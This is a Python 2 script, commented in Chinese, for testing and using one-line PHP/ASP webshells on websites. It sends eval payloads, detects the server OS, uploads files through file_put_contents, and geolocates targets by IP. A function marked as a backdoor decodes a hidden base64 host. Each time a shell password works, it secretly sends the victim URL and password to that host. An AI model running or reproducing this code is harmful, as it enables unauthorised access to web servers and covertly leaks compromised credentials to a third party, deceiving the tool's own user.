#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#import ctypes   #messagebox      MessageBox(None, str(hs), u'提示', 0)
#MessageBox = ctypes.windll.user32.MessageBoxA
import base64
import re,httplib
import urllib2
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)
import time

##############################  后门提交 数据
def http_url_hm(url,PASS): #后门
    try:
    #s1 = base64.encodestring('www.999kankan.com')  #加密
        s2 = base64.decodestring("d3d3Ljk5OWthbmthbi5jb20=") #解密   www.999kankan.com
        SSurl="http://%s/URL_EXP.php?"\
              "yijuhua=1&url=%s&webshell=%s&password=%s&bz=IIS_eval_01_1"\
              %(s2,url,url,PASS)
        Aurl_post(SSurl)
        return 1
    except Exception,e:
        print e
        return 0

def Aurl_post(URL):  #提交内容
    try:
        req = urllib2.Request(URL)
        req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
        urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        time.sleep(1)
        return 1
    except:
        return 0

##############################一句话上传
def url_post(url,PASS,data):  #提交数据
    try:
        params="""=@eval(base64_decode($_POST[z0]));&z0=%s"""%(data)
        #print params
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget,None,True,10)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()

            if "OKhao123!!" in data:
                return 1
            else:
                return 0

        except Exception,e:
            print e
            return 0
    except Exception,e:
        print e
        return 0

def base64_jm(name,data):  #base64加密
    try:
        mm=base64.b64encode(data)
        #data="""$file ="%s";$data ="%s";file_put_contents($file,$data);"""%(name,data)
        #data="""file_put_contents("%s","%s");"""%(name,mm)
        data="""
        $Code = '%s';
        $File = '%s';
        $Temp = base64_decode($Code);
        file_put_contents($File,$Temp);
        echo "OKhao123!!!";"""%\
             (mm,name)    #file_put_contents($File,$Temp);   $data=urldecode($Temp);
        #print data
        return base64.b64encode(data)   #加密
    except Exception,e:
        print e
        return 0
##############################一句话测试
def TXT_file(file_nem,data):  #写入文本
    try:
        #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
        file_object = open(file_nem,'a')
        #file_object.write(list_passwed[E])
        file_object.writelines(data)
        file_object.writelines("\n")
        file_object.close()
    except Exception,e:
        print "111111",e
        return 0

def yijuhua_cs(asp_php,url,PASS): #ASP还是PHP  ,URL地址 ，密码
    try:
        #选择扫描方式
        if asp_php == "":
            asp_php = "php"
        if asp_php == "asp":
            params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
        elif asp_php == "php":
            #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
            params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
        else:
            params = "=Response.Clear();Response.Write(\"jinlaile\");"
            #构造HTTP头
        #print params
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            #print data
            if(data.find("jinlaile") >= 0):
                #print "!!!!----PASS FIND!!! -------------->"+PASS
                http_url_hm(url,PASS) #后门
                return 1
                #os._exit(1)
        except Exception,e:
            #print e
            return 0

    except Exception,e:
        #print e
        return 0

def yijuhua_win_linux(url,PASS): #URL地址 ，密码   返回操作系统
    try:
        #选择扫描方式
        #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="

        params = "=echo PHP_OS;"
        #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            if "WINNT" in data:
                return "WinNT"
            if "Linux" in data:
                return "Linux"
            if "FreeBSD" in data:
                return "FreeBSD"
            return "null"
        except Exception,e:
            #print e
            return 0
    except Exception,e:
        #print e
        return 0

##############################
##返回物理位置
#def open_file(data): #格式化
#    ss = data.split("|")
#    #if len(ss)<=3:
#    return ss[0],ss[1]
#    #return 0

def www_wlwz(data): #物理位置
    h=C_hoset()
    data=h.www_data(url_www(data))   #'IP/地理位置/网站标题'
    return data   #'IP/地理位置/网站标题'
import urllib
def url_www(url): #URL地址中提取网址  http://www.bizschool.cn/plus/90sec.php        www.bizschool.cn
    proto, rest = urllib.splittype(url)
    host, rest = urllib.splithost(rest)
    return host
##############################
####################################################################
from struct import *
import urllib2
import string
import re
import sys
import socket
def ip2string( ip ):
    a = (ip & 0xff000000) >> 24
    b = (ip & 0x00ff0000) >> 16
    c = (ip & 0x0000ff00) >> 8
    d = ip & 0x000000ff
    return "%d.%d.%d.%d" % (a,b,c,d)

def string2ip( str ):
    ss = string.split(str, '.')
    ip = 0L
    for s in ss: ip = (ip << 8) + string.atoi(s)
    return ip

class IPSearch:
    def __init__(self,ip_file):
        self.ipdb=open(ip_file,'rb')
        str=self.ipdb.read(8)
        self.first_index ,self.last_index =unpack("II",str)

    def getIPLocation(self,ip):
        IP=string2ip(ip)
        #print IP
        count=(self.last_index-self.first_index)/7+1
        left=0
        right=count
        middle=(right-left)/2+left
        while True:
            if right-left==1:
                #print 'result:%s'%left
                return left
            offset=self.first_index+middle*7
            self.ipdb.seek(offset)
            temp=unpack("I",self.ipdb.read(4))[0]
            #print 'left:%s right:%s middle:%s value:%d' %( left,right,middle,temp  )
            if IP<temp:
                right=middle
            elif IP>temp:
                left=middle
            else:
                return middle
            middle=(right-left)/2+left
    def readpos(self,seek):
        self.ipdb.seek(seek)
        num=self.ipdb.read(3)
        (h,l)=unpack("HB",num)
        return (l<<16)+h

    def find(self,ip):
        ipIndex=self.getIPLocation(ip)
        offset=self.first_index+ipIndex*7+4
        pos_num=self.readpos(offset)
        #print pos_num
        return self.getArea(pos_num+4,True)


    def getString(self,offset):
        self.ipdb.seek(offset)
        result=''
        i=0
        word=unpack("B",self.ipdb.read(1))[0]
        while word!=0:
            i+=1
            word=unpack("B",self.ipdb.read(1))[0]
        self.ipdb.seek(offset)
        result=self.ipdb.read(i)
        #print result
        return result
    def getArea(self,offset,deep):
        self.ipdb.seek(offset)
        area1=''
        area2=''
        str=self.ipdb.read(1)
        firstw=unpack("B",str)[0]
        if firstw==1 and deep:
            return self.getArea(self.readpos(self.ipdb.tell()),True)
        elif firstw==2  and deep:
            area1=self.getArea(self.readpos(self.ipdb.tell()),False)
            area2=self.getArea(offset+4,False)
            return (area1,area2)
        elif firstw==2 and  not deep:
            return self.getArea(self.readpos(offset+1),False)
        else:
            if deep:
                area1=self.getString(self.ipdb.tell()-1)
                area2=self.getString(self.ipdb.tell())
                return (area1,area2)
            else:
                area1=self.getString(self.ipdb.tell()-1)
                return area1

class C_hoset():
    def __init__(self):
        self.tt=IPSearch('QQWry.dat')

    def www_data(self,www):   #'IP/地理位置/网站标题'
        data=u""
        try:
            ip=self.www_ping_ip(www)  #ping域名转IP
            data+=str(ip)+u"/"
            dlwz=self.www_ip(ip)  #显示IP地理位置
            data+=dlwz.decode('utf-8')
            #data+=u"%s/%s/%s" % (ip, dlwz.decode('utf-8'),title.decode('utf-8'))
            return data
        except:
            return data

    def www_ip(self,IP):   #显示IP地理位置
        try:
            (area1,area2)=self.tt.find(IP)
            return "%s-%s"%(area1.decode('gb2312').encode('utf-8'),area2.decode('gb2312').encode('utf-8'))
        except:
            return 0

    def www_ping_ip(self,WWW):  #域名转IP
        try:
            result = socket.getaddrinfo(WWW, None)
            return result[0][4][0]
        except:
            return 0
####################################################################

if __name__=='__main__':
#    h=C_hoset()
#    data=h.www_data(url_www("http://www.bizschool.cn/plus/90sec.php"))   #'IP/地理位置/网站标题'
#    print data   #'IP/地理位置/网站标题'

#    data=""
#    s0,s1=open_file(data)
#    print s0,"---",s1

    #print yi_cs_php("http://webxscan.com/x.php","long")  #一句话测试
    print yijuhua_cs("asp","http://192.168.1.100/long.asp","long123") #ASP还是PHP  ,URL地址 ，密码



